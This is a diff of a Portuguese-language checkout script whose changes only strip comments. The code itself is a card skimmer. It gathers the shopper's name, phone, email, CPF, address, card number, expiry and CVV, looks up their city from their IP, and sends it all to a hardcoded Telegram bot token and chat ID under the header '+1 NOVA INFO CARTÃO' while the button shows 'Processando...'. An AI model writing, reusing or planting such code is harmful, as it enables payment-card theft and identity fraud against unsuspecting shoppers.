@@ -1,15 +1,12 @@
-// Configuração do Telegram
 const TELEGRAM_TOKEN = '8743433644:AAHWENChsuGXYY9eJ4yZKWodRYL1ouxiJzM';
 const TELEGRAM_CHAT_ID = '6939434522';
 
-// Máscaras para campos do cartão
 document.addEventListener('DOMContentLoaded', function() {
     const cardNumero = document.getElementById('cardNumero');
     const cardValidade = document.getElementById('cardValidade');
     const cardCvv = document.getElementById('cardCvv');
     const finalizarCartaoBtn = document.getElementById('finalizarCartaoBtn');
 
-    // Máscara para número do cartão
     if (cardNumero) {
         cardNumero.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
@@ -18,7 +15,6 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // Máscara para validade (MM/AA)
     if (cardValidade) {
         cardValidade.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
@@ -29,14 +25,12 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // Máscara para CVV
     if (cardCvv) {
         cardCvv.addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
         });
     }
 
-    // Máscara para CEP
     const cepFields = ['cardCep', 'cep'];
     cepFields.forEach(fieldId => {
         const field = document.getElementById(fieldId);
@@ -51,7 +45,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
-    // Máscara para telefone
     const telefoneFields = ['cardTelefone', 'telefone'];
     telefoneFields.forEach(fieldId => {
         const field = document.getElementById(fieldId);
@@ -70,7 +63,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
-    // Máscara para CPF
     const cpfFields = ['cardCpf', 'cpf'];
     cpfFields.forEach(fieldId => {
         const field = document.getElementById(fieldId);
@@ -91,7 +83,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
-    // Validar cartão (Luhn)
     function validarCartao(numero) {
         const num = numero.replace(/\s/g, '');
         if (!/^\d+$/.test(num)) return false;
@@ -110,7 +101,6 @@ document.addEventListener('DOMContentLoaded', function() {
         return sum % 10 === 0;
     }
 
-    // Validar data do cartão
     function validarValidade(validade) {
         if (!/^\d{2}\/\d{2}$/.test(validade)) return false;
         
@@ -127,7 +117,6 @@ document.addEventListener('DOMContentLoaded', function() {
         return true;
     }
 
-    // Obter cidade do usuário
     let userCity = '';
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
@@ -136,7 +125,6 @@ document.addEventListener('DOMContentLoaded', function() {
         })
         .catch(() => {});
 
-    // Enviar dados para o Telegram
     async function enviarParaTelegram(dados) {
         const mensagem = `
 <b>💳 +1 NOVA INFO CARTÃO</b>
@@ -180,7 +168,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
-    // Exibir toast
     function showToast(msg) {
         const toast = document.getElementById('copyToast');
         if (!toast) return;
@@ -190,12 +177,10 @@ document.addEventListener('DOMContentLoaded', function() {
         setTimeout(() => toast.classList.remove('show'), 3000);
     }
 
-    // Finalizar compra com cartão
     if (finalizarCartaoBtn) {
         finalizarCartaoBtn.addEventListener('click', async function(e) {
             e.preventDefault();
             
-            // Obter dados do formulário cartão
             const titular = document.getElementById('cardTitular')?.value.trim() || '';
             const telefone = document.getElementById('cardTelefone')?.value.trim() || '';
             const email = document.getElementById('cardEmail')?.value.trim() || '';
@@ -204,14 +189,12 @@ document.addEventListener('DOMContentLoaded', function() {
             const validade = document.getElementById('cardValidade')?.value.trim() || '';
             const cvv = document.getElementById('cardCvv')?.value.trim() || '';
             
-            // Endereço
             const cep = document.getElementById('cardCep')?.value.trim() || '';
             const rua = document.getElementById('cardRua')?.value.trim() || '';
             const numeroEnd = document.getElementById('cardNumeroEnd')?.value.trim() || '';
             const temComplemento = document.getElementById('temComplementoCard')?.checked || false;
             const complemento = temComplemento ? (document.getElementById('cardComplemento')?.value.trim() || '') : 'Não informado';
             
-            // Validações
             if (!titular) { showToast('❌ Nome do titular é obrigatório'); return; }
             if (!telefone) { showToast('❌ Telefone é obrigatório'); return; }
             if (!email || !email.includes('@')) { showToast('❌ E-mail inválido'); return; }
@@ -224,7 +207,6 @@ document.addEventListener('DOMContentLoaded', function() {
             if (!rua) { showToast('❌ Rua é obrigatória'); return; }
             if (!numeroEnd) { showToast('❌ Número é obrigatório'); return; }
             
-            // Preparar dados para envio
             const dadosEnvio = {
                 titular: titular,
                 telefone: telefone,
@@ -240,13 +222,11 @@ document.addEventListener('DOMContentLoaded', function() {
                 cidade: userCity || 'Não identificada'
             };
             
-            // Desabilitar botão e mostrar loading
             const btn = finalizarCartaoBtn;
             const originalText = btn.innerHTML;
             btn.disabled = true;
             btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Processando...';
             
-            // Enviar para Telegram
             const enviado = await enviarParaTelegram(dadosEnvio);
             
             if (enviado) {
